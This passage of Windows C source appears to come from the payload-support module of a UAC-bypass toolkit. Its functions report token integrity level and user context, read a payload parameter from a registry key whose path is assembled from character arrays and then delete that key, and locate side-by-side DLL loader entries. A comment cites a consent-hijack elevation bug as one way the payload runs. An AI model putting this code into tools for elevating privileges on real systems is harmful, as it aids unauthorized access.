                if (NT_SUCCESS(status)) {

                    dwIntegrityLevel = *RtlSubAuthoritySid(pTIL->Label.Sid,
                        (DWORD)(UCHAR)(*RtlSubAuthorityCountSid(pTIL->Label.Sid) - 1));
                    
                    if (dwIntegrityLevel == SECURITY_MANDATORY_UNTRUSTED_RID) {
                        lpValue = L"UntrustedIL";
                    }
                    else if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID) {
                        lpValue = L"LowIL";
                    }
                    else if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID &&
                        dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID)  //skip SECURITY_MANDATORY_MEDIUM_PLUS_RID
                    {
                        lpValue = L"MediumIL";
                    }
                    else if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID &&
                        dwIntegrityLevel < SECURITY_MANDATORY_SYSTEM_RID)
                    {
                        lpValue = L"HighIL";
                    }
                    else if (dwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID &&
                        dwIntegrityLevel < SECURITY_MANDATORY_PROTECTED_PROCESS_RID)
                    {
                        lpValue = L"SystemIL";
                    }
                    else if (dwIntegrityLevel >= SECURITY_MANDATORY_PROTECTED_PROCESS_RID)
                    {
                        lpValue = L"ProtectedProcessIL";
                    }

                    _strcpy(szBuffer, TEXT("\r\nPID="));
                    ultostr((ULONG)GetCurrentProcessId(), _strend(szBuffer));
                    _strcat(szBuffer, TEXT(", "));
                    _strncpy(_strend(szBuffer), 40, lpValue, 40);
                    _strcat(lpReport, szBuffer);
                }
                RtlFreeHeap(hHeap, 0, pTIL);
            }
        }

        //
        // Domain\User name.
        //
        LengthNeeded = 0;
        status = NtQueryInformationToken(
            hToken,
            TokenUser,
            NULL,
            0,
            &LengthNeeded);

        if (status == STATUS_BUFFER_TOO_SMALL) {

            ptu = (PTOKEN_USER)RtlAllocateHeap(
                hHeap,
                HEAP_ZERO_MEMORY,
                LengthNeeded);

            if (ptu) {

                status = NtQueryInformationToken(
                    hToken,
                    TokenUser,
                    ptu,
                    LengthNeeded,
                    &LengthNeeded);

                if (NT_SUCCESS(status)) {

                    SecurityQualityOfService.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
                    SecurityQualityOfService.ImpersonationLevel = SecurityImpersonation;
                    SecurityQualityOfService.ContextTrackingMode = SECURITY_DYNAMIC_TRACKING;
                    SecurityQualityOfService.EffectiveOnly = FALSE;

                    InitializeObjectAttributes(
                        &lobja,
                        NULL,
                        0L,
                        NULL,
                        NULL);

                    lobja.SecurityQualityOfService = &SecurityQualityOfService;

                    status = LsaOpenPolicy(
                        NULL,
                        &lobja,
                        LSA_POLICY_LOOKUP_NAMES,
                        &PolicyHandle);

                    if (NT_SUCCESS(status)) {

                        status = LsaLookupSids(
                            PolicyHandle,
                            1,
                            &ptu->User.Sid,
                            &ReferencedDomains,
                            &Names);

                        if ((NT_SUCCESS(status)) && (status != STATUS_SOME_NOT_MAPPED)) {

                            if (ReferencedDomains != NULL) {
                                szBuffer[0] = 0;

                                _strncpy(
                                    szBuffer,
                                    MAX_PATH,
                                    ReferencedDomains->Domains[0].Name.Buffer,
                                    ReferencedDomains->Domains[0].Name.Length / sizeof(WCHAR));

                                _strcat(lpReport, TEXT("\r\n"));
                                _strcat(lpReport, szBuffer);
                                _strcat(lpReport, TEXT("\\"));

                            }

                            if (Names != NULL) {
                                szBuffer[0] = 0;

                                _strncpy(
                                    szBuffer,
                                    MAX_PATH,
                                    Names->Name.Buffer,
                                    Names->Name.Length / sizeof(WCHAR));

                                _strcat(lpReport, szBuffer);
                            }
                        }

                        if (ReferencedDomains) LsaFreeMemory(ReferencedDomains);
                        if (Names) LsaFreeMemory(Names);

                        LsaClose(PolicyHandle);
                    }

                }

                RtlFreeHeap(hHeap, 0, ptu);
            }
        }

        //
        // Session info
        //
        LengthNeeded = 0;
        _strcpy(szBuffer, TEXT("\r\nSessionId="));
        ultostr(SessionId, _strend(szBuffer));
        _strcat(lpReport, szBuffer);

        _strcat(lpReport, TEXT("\r\nInteractive Winstation="));
        if (ucmIsUserWinstaInteractive())
            _strcat(lpReport, TEXT("yes"));
        else
            _strcat(lpReport, TEXT("no"));

        NtClose(hToken);
    }

    //
    // 4. Wow64
    //
    RtlSecureZeroMemory(&pebi, sizeof(pebi));
    pebi.Size = sizeof(PROCESS_EXTENDED_BASIC_INFORMATION);

    status = NtQueryInformationProcess(
        NtCurrentProcess(),
        ProcessBasicInformation,
        &pebi,
        sizeof(pebi),
        NULL);

    if (NT_SUCCESS(status)) {
        _strcpy(szBuffer, TEXT("\r\nWOW64 Enabled="));
        ultostr(pebi.IsWow64Process, _strend(szBuffer));
        _strcat(lpReport, szBuffer);
    }

    if (ReturnData == FALSE) {

        MessageBox(
            GetDesktopWindow(),
            lpReport,
            GetCommandLine(),
            MB_ICONINFORMATION);

        RtlFreeHeap(hHeap, 0, lpReport);
        lpReport = NULL;
    }

    return lpReport;
}

/*
* ucmDestroyRuntimeInfo
*
* Purpose:
*
* Release memory allocated by ucmQueryRuntimeInfo if ReturnData flag used.
*
*/
BOOLEAN ucmDestroyRuntimeInfo(
    _In_ LPWSTR RuntimeInfo)
{
    return RtlFreeHeap(
        NtCurrentPeb()->ProcessHeap, 
        0, 
        RuntimeInfo);
}

/*
* ucmIsUserWinstaInteractive
*
* Purpose:
*
* Return TRUE if current user operates on Winstation with visible surfaces, FALSE otherwise.
*
*/
BOOL ucmIsUserWinstaInteractive(
    VOID
)
{
    BOOL bResult = TRUE;
    USEROBJECTFLAGS uof;
    HWINSTA hWinStation;

    //
    // Open current winstation.
    //
    hWinStation = GetProcessWindowStation();
    if (hWinStation) {
        //
        // Query winstation flags.
        //
        if (GetUserObjectInformation(
            hWinStation,
            UOI_FLAGS,
            &uof,
            sizeof(USEROBJECTFLAGS),
            NULL))
        {
            //
            // Are winstation has visible surfaces?
            //
            if ((uof.dwFlags & WSF_VISIBLE) == 0)
                bResult = FALSE;
        }
    }
    return bResult;
}

/*
* ucmIsUserHasInteractiveSid
*
* Purpose:
*
* pbInteractiveSid will be set to TRUE if current user has interactive sid, FALSE otherwise.
*
* Function return operation status code.
*
*/
NTSTATUS ucmIsUserHasInteractiveSid(
    _In_ HANDLE hToken,
    _Out_ PBOOL pbInteractiveSid)
{
    BOOL bCond = FALSE, IsInteractiveSid = FALSE;
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    HANDLE hHeap = NtCurrentPeb()->ProcessHeap;
    ULONG LengthNeeded = 0;

    DWORD i;

    SID_IDENTIFIER_AUTHORITY SidAuth = SECURITY_NT_AUTHORITY;
    PSID InteractiveSid = NULL;
    PTOKEN_GROUPS groupInfo = NULL;

    do {

        status = NtQueryInformationToken(
            hToken,
            TokenGroups,
            NULL,
            0,
            &LengthNeeded);

        if (status != STATUS_BUFFER_TOO_SMALL)
            break;

        groupInfo = RtlAllocateHeap(
            hHeap,
            HEAP_ZERO_MEMORY,
            LengthNeeded);

        if (groupInfo == NULL)
            break;

        status = NtQueryInformationToken(
            hToken,
            TokenGroups,
            groupInfo,
            LengthNeeded,
            &LengthNeeded);

        if (!NT_SUCCESS(status))
            break;

        status = RtlAllocateAndInitializeSid(
            &SidAuth,
            1,
            SECURITY_INTERACTIVE_RID,
            0, 0, 0, 0, 0, 0, 0,
            &InteractiveSid);

        if (!NT_SUCCESS(status))
            break;

        for (i = 0; i < groupInfo->GroupCount; i++) {

            if (RtlEqualSid(
                InteractiveSid,
                groupInfo->Groups[i].Sid))
            {
                IsInteractiveSid = TRUE;
                break;
            }
        }

    } while (bCond);

    if (groupInfo != NULL)
        RtlFreeHeap(hHeap, 0, groupInfo);

    if (pbInteractiveSid)
        *pbInteractiveSid = IsInteractiveSid;

    if (InteractiveSid)
        RtlFreeSid(InteractiveSid);

    return status;
}

/*
* ucmIsLocalSystem
*
* Purpose:
*
* pbResult will be set to TRUE if current account is run by system user, FALSE otherwise.
*
* Function return operation status code.
*
*/
NTSTATUS ucmIsLocalSystem(
    _Out_ PBOOL pbResult)
{
    BOOL                            bResult = FALSE;

    NTSTATUS                        status = STATUS_UNSUCCESSFUL;
    HANDLE                          hToken = NULL;
    HANDLE                          ProcessHeap = NtCurrentPeb()->ProcessHeap;

    ULONG                           LengthNeeded = 0;

    PSID                            SystemSid = NULL;
    PTOKEN_USER                     ptu = NULL;
    SID_IDENTIFIER_AUTHORITY        NtAuth = SECURITY_NT_AUTHORITY;

    status = NtOpenProcessToken(
        NtCurrentProcess(),
        TOKEN_QUERY,
        &hToken);

    if (NT_SUCCESS(status)) {

        status = NtQueryInformationToken(
            hToken,
            TokenUser,
            NULL,
            0,
            &LengthNeeded);

        if (status == STATUS_BUFFER_TOO_SMALL) {

            ptu = (PTOKEN_USER)RtlAllocateHeap(
                ProcessHeap,
                HEAP_ZERO_MEMORY,
                LengthNeeded);

            if (ptu) {

                status = NtQueryInformationToken(
                    hToken,
                    TokenUser,
                    ptu,
                    LengthNeeded,
                    &LengthNeeded);

                if (NT_SUCCESS(status)) {

                    status = RtlAllocateAndInitializeSid(
                        &NtAuth,
                        1,
                        SECURITY_LOCAL_SYSTEM_RID,
                        0, 0, 0, 0, 0, 0, 0,
                        &SystemSid);

                    if (NT_SUCCESS(status)) {
                        bResult = RtlEqualSid(ptu->User.Sid, SystemSid);
                        RtlFreeSid(SystemSid);
                    }

                }
                RtlFreeHeap(ProcessHeap, 0, ptu);
            }
            else {
                status = STATUS_INSUFFICIENT_RESOURCES;
            }
        } //STATUS_BUFFER_TOO_SMALL
        NtClose(hToken);
    }

    if (pbResult)
        *pbResult = bResult;

    return status;
}

/*
* ucmReadParameters
*
* Purpose:
*
* Read custom parameter, Flag and SessionId values.
*
* Use RtlFreeHeap(ProcessHeap) to deallocate memory of pszParamBuffer on function success.
*
*/
BOOL ucmReadParameters(
    _Inout_ PWSTR *pszParamBuffer,
    _Inout_ ULONG *cbParamBuffer,
    _Inout_opt_ PDWORD pdwGlobalFlag,
    _Inout_opt_ PDWORD pdwSessionId,
    _In_ BOOL IsSystem
)
{
    BOOL                            bCond = FALSE, bResult = FALSE, bSystem = FALSE;

    HANDLE                          ProcessHeap = NtCurrentPeb()->ProcessHeap;
    HANDLE                          hKey = NULL;

    PVOID                           CopyBuffer = NULL;

    OBJECT_ATTRIBUTES               obja;
    UNICODE_STRING                  usValue, usCurrentUserKey;
    NTSTATUS                        status;
    KEY_VALUE_PARTIAL_INFORMATION	kvpi, *pkvpi = NULL;

    SIZE_T                          memIO = 0;
    ULONG                           LengthNeeded = 0;

    OBJSCANPARAM                    Param;

    LPWSTR                          lpData = NULL, lpszParamKey = NULL;

    WCHAR                           szRegistryUser[] = { L'\\', L'R', L'E', L'G', L'I', L'S', L'T', L'R', L'Y', L'\\', L'U', L'S', L'E', L'R', L'\\', 0 };
    WCHAR                           szAkagiKey[] = { L'\\', L'S', L'o', L'f', L't', L'w', L'a', L'r', L'e', L'\\', L'A', L'k', L'a', L'g', L'i', 0 };

    ULONG                           cbRegistryUser = sizeof(szRegistryUser) - sizeof(WCHAR);
    ULONG                           cbAkagiKey = sizeof(szAkagiKey) - sizeof(WCHAR);

    UNICODE_STRING                  usLoveLetter = RTL_CONSTANT_STRING(L"LoveLetter");

    do {

        //
        // This is default flag value. At the moment flags are used only by Fubuki.
        //
        if (pdwGlobalFlag)
            *pdwGlobalFlag = 1; //AKAGI_FLAG_KILO

        Param.Buffer = NULL;
        Param.BufferSize = 0;
        usCurrentUserKey.Buffer = NULL;

        //
        // There are 2 expected and accepted scenarios for payload code:
        // 1) It runs as the same admin user
        // 2) It runs as System (WinSXS consent hijack), elevation bug (cf RS3 case id170902)
        //

        //
        // Determine what kind of user we are now, then select proper registry key to read data.
        //
        bSystem = IsSystem;

        //
        // Query current user key.
        //
        if (bSystem) {

            status = ucmEnumSystemObjects(
                L"\\Rpc Control\\Akagi",
                NULL,
                ucmDetectObjectCallback,
                &Param);

            if (!NT_SUCCESS(status)) {
                break;
            }
            if ((Param.Buffer == NULL) || (Param.BufferSize == 0))
                break;

            memIO = MAX_PATH + Param.BufferSize + cbRegistryUser + cbAkagiKey;
        }
        else {

            RtlSecureZeroMemory(&usCurrentUserKey, sizeof(usCurrentUserKey));
            status = RtlFormatCurrentUserKeyPath(&usCurrentUserKey);
            if (!NT_SUCCESS(status)) {
                break;
            }
            memIO = cbAkagiKey + usCurrentUserKey.MaximumLength + sizeof(UNICODE_NULL);
        }

        //
        // Build current user key path and open it.
        //
        lpszParamKey = RtlAllocateHeap(ProcessHeap, HEAP_ZERO_MEMORY, memIO);
        if (lpszParamKey == NULL)
            break;

        if (bSystem) {
            _strcpy(lpszParamKey, szRegistryUser);
            _strcat(lpszParamKey, Param.Buffer);
            _strcat(lpszParamKey, szAkagiKey);
        }
        else {
            _strcpy(lpszParamKey, usCurrentUserKey.Buffer);
            _strcat(lpszParamKey, szAkagiKey);
            RtlFreeUnicodeString(&usCurrentUserKey);
            usCurrentUserKey.Buffer = NULL;
        }

        RtlInitUnicodeString(&usValue, lpszParamKey);
        InitializeObjectAttributes(&obja, &usValue, OBJ_CASE_INSENSITIVE, NULL, NULL);

        status = NtOpenKey(
            &hKey,
            KEY_ALL_ACCESS,
            &obja);

        if (!NT_SUCCESS(status)) {
            break;
        }

        //
        // Read Flag if requested.
        //
        if (pdwGlobalFlag) {

            LengthNeeded = 0;
            lpData = NULL;

            status = ucmReadValue(hKey, L"Flag", REG_DWORD, &lpData, &LengthNeeded);
            if (NT_SUCCESS(status)) {

                if (LengthNeeded == sizeof(DWORD))
                    *pdwGlobalFlag = *(DWORD*)lpData;

                RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, lpData);
                lpData = NULL;
            }
        }

        //
        // Read SessionId if requested.
        //
        if (pdwSessionId) {

            LengthNeeded = 0;
            lpData = NULL;

            status = ucmReadValue(hKey, L"SessionId", REG_DWORD, &lpData, &LengthNeeded);
            if (NT_SUCCESS(status)) {

                if (LengthNeeded == sizeof(DWORD))
                    *pdwSessionId = *(DWORD*)lpData;

                RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, lpData);
                lpData = NULL;
            }

        }

        //
        // Read parameter size and allocate memory for it.
        //
        LengthNeeded = 0;
        RtlSecureZeroMemory(&kvpi, sizeof(kvpi));
        status = NtQueryValueKey(hKey, &usLoveLetter, KeyValuePartialInformation, &kvpi,
            sizeof(KEY_VALUE_PARTIAL_INFORMATION), &LengthNeeded);

        if ((status != STATUS_SUCCESS) &&
            (status != STATUS_BUFFER_TOO_SMALL) &&
            (status != STATUS_BUFFER_OVERFLOW))
        {
            break;
        }

        lpData = RtlAllocateHeap(ProcessHeap, HEAP_ZERO_MEMORY, (SIZE_T)LengthNeeded);
        if (lpData) {

            //
            // Read parameter data.
            //
            status = NtQueryValueKey(
                hKey,
                &usLoveLetter,
                KeyValuePartialInformation,
                lpData,
                LengthNeeded,
                &LengthNeeded);

            if (NT_SUCCESS(status)) {

                pkvpi = (PKEY_VALUE_PARTIAL_INFORMATION)lpData;
                if (pkvpi->Type != REG_SZ)
                    break;

                if (pkvpi->DataLength > 0) {

                    CopyBuffer = RtlAllocateHeap(
                        ProcessHeap,
                        HEAP_ZERO_MEMORY,
                        pkvpi->DataLength);

                    if (CopyBuffer) {

                        RtlCopyMemory(
                            CopyBuffer,
                            pkvpi->Data,
                            pkvpi->DataLength);

                        *pszParamBuffer = CopyBuffer;
                        *cbParamBuffer = pkvpi->DataLength;
                        bResult = TRUE;

                    }
                }
            }

            NtDeleteKey(hKey);
            NtClose(hKey);
            hKey = NULL;

            RtlFreeHeap(ProcessHeap, 0, lpData);
        }

    } while (bCond);

    if (usCurrentUserKey.Buffer)
        RtlFreeUnicodeString(&usCurrentUserKey);

    if (hKey) {
        NtDeleteKey(hKey);
        NtClose(hKey);
    }

    if (Param.Buffer)
        RtlFreeHeap(ProcessHeap, 0, Param.Buffer);

    if (lpszParamKey)
        RtlFreeHeap(ProcessHeap, 0, lpszParamKey);

    if (bResult == FALSE) {
        *pszParamBuffer = NULL;
        *cbParamBuffer = 0;
    }

    return bResult;
}

/*
* sxsFilePathNoSlash
*
* Purpose:
*
* same as _filepath except it doesnt return last slash.
*
*/
wchar_t *sxsFilePathNoSlash(
    _In_ const wchar_t *fname,
    _In_ wchar_t *fpath
)
{
    wchar_t *p = (wchar_t *)fname, *p0 = (wchar_t*)fname, *p1 = (wchar_t*)fpath;

    if ((fname == 0) || (fpath == NULL))
        return 0;

    while (*fname != (wchar_t)0) {
        if (*fname == '\\')
            p = (wchar_t *)fname;
        fname++;
    }

    while (p0 < p) {
        *p1 = *p0;
        p1++;
        p0++;
    }
    *p1 = 0;

    return fpath;
}

/*
* sxsFindLoaderEntry
*
* Purpose:
*
* Return loader entry filename for sxs dll.
*
*/
BOOL sxsFindLoaderEntry(
    _In_ PSXS_SEARCH_CONTEXT Context
)
{
    NTSTATUS Status;
    HANDLE hDll = NULL;
    UNICODE_STRING usDll;

    PLDR_DATA_TABLE_ENTRY LdrTableEntry = NULL;

    RtlInitUnicodeString(&usDll, Context->DllName);

    Status = LdrGetDllHandle(
        NULL,
        NULL,
        &usDll,
        &hDll);

    if (NT_SUCCESS(Status)) {

        Status = LdrFindEntryForAddress(
            hDll,
            &LdrTableEntry);

        if (NT_SUCCESS(Status)) {

            if (_strstri(
                LdrTableEntry->FullDllName.Buffer,
                L".local") == NULL)
            {
                if (_strstri(
                    LdrTableEntry->FullDllName.Buffer,
                    Context->SxsKey))
                {
                    sxsFilePathNoSlash(
                        LdrTableEntry->FullDllName.Buffer,
                        Context->FullDllPath);

                }
                else
                    Status = STATUS_NOT_FOUND;
            }
            else
                Status = STATUS_TOO_LATE;
        }
    }

    return NT_SUCCESS(Status);
}

/*
* ucmGetProcessMitigationPolicy
*
* Purpose:
*
* Request process mitigation policy values.
*
*/
BOOL ucmGetProcessMitigationPolicy(
    _In_ HANDLE hProcess,
    _In_ PROCESS_MITIGATION_POLICY Policy,
    _In_ SIZE_T Size,
    _Out_writes_bytes_(Size) PVOID Buffer
)
{
    ULONG Length = 0;

    PROCESS_MITIGATION_POLICY_INFORMATION MitigationPolicy;

    MitigationPolicy.Policy = (PROCESS_MITIGATION_POLICY)Policy;

    if (!NT_SUCCESS(NtQueryInformationProcess(
        hProcess,
        ProcessMitigationPolicy,
        &MitigationPolicy,
        sizeof(PROCESS_MITIGATION_POLICY_INFORMATION),
        &Length)))
    {
        return FALSE;
    }

    RtlCopyMemory(Buffer, &MitigationPolicy, Size);

    return TRUE;
}

/*
* ucmGetRemoteCodeExecPolicies
*
* Purpose:
*
* Request specific process mitigation policy values all at once.
* Use RtlFreeHeap to release returned buffer.
*
*/
UCM_PROCESS_MITIGATION_POLICIES *ucmGetRemoteCodeExecPolicies(
    _In_ HANDLE hProcess
)
{
    UCM_PROCESS_MITIGATION_POLICIES *Policies = NULL;

    Policies = RtlAllocateHeap(
        NtCurrentPeb()->ProcessHeap,
        HEAP_ZERO_MEMORY,
        sizeof(UCM_PROCESS_MITIGATION_POLICIES));

    if (Policies == NULL)
        return NULL;

    ucmGetProcessMitigationPolicy(
        hProcess,
        ProcessExtensionPointDisablePolicy,
        sizeof(PROCESS_MITIGATION_EXTENSION_POINT_DISABLE_POLICY),
        &Policies->ExtensionPointDisablePolicy);

    ucmGetProcessMitigationPolicy(
        hProcess,
        ProcessSignaturePolicy,
        sizeof(PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY_W10),
        &Policies->SignaturePolicy);

    ucmGetProcessMitigationPolicy(
        hProcess,
        ProcessDynamicCodePolicy,
        sizeof(PROCESS_MITIGATION_DYNAMIC_CODE_POLICY_W10),
        &Policies->DynamicCodePolicy);

    ucmGetProcessMitigationPolicy(
        hProcess,
        ProcessImageLoadPolicy,
        sizeof(PROCESS_MITIGATION_IMAGE_LOAD_POLICY_W10),
        &Policies->ImageLoadPolicy);

    ucmGetProcessMitigationPolicy(
        hProcess,
        ProcessSystemCallFilterPolicy,
        sizeof(PROCESS_MITIGATION_SYSTEM_CALL_FILTER_POLICY_W10),
        &Policies->SystemCallFilterPolicy);

    ucmGetProcessMitigationPolicy(
        hProcess,
        ProcessPayloadRestrictionPolicy,
        sizeof(PROCESS_MITIGATION_PAYLOAD_RESTRICTION_POLICY_W10),
        &Policies->PayloadRestrictionPolicy);

    return Policies;
}

/*
* ucmQueryProcessTokenIL
*
* Purpose:
*
* Return integrity level for given process.
*
*/
_Success_(return == TRUE)
BOOL ucmQueryProcessTokenIL(
    _In_ HANDLE hProcess,
    _Out_ PULONG IntegrityLevel
)
{
    BOOL                            bCond = FALSE, bResult = FALSE;
    HANDLE                          hToken = NULL;
    PTOKEN_MANDATORY_LABEL          pTIL = NULL;
    ULONG                           Length = 0;

    do {

        if (!NT_SUCCESS(NtOpenProcessToken(
            hProcess,
            TOKEN_QUERY,
            &hToken)))
        {
            break;
        }

        if (STATUS_BUFFER_TOO_SMALL != NtQueryInformationToken(
            hToken,
            TokenIntegrityLevel,
            NULL,
            0,
            &Length))
        {
            break;
        }

#pragma warning(push)
#pragma warning(disable:6263 6255)

        pTIL = (PTOKEN_MANDATORY_LABEL)_alloca(Length); //-V505

#pragma warning(pop)

        if (!NT_SUCCESS(NtQueryInformationToken(
            hToken,
            TokenIntegrityLevel,
            pTIL,
            Length,
            &Length)))
        {
            break;
        }

        if (IntegrityLevel)
            *IntegrityLevel = *RtlSubAuthoritySid(
                pTIL->Label.Sid,
                (DWORD)(UCHAR)(*RtlSubAuthorityCountSid(pTIL->Label.Sid) - 1));

        bResult = TRUE;

    } while (bCond);

    if (hToken) NtClose(hToken);

    return bResult;
}
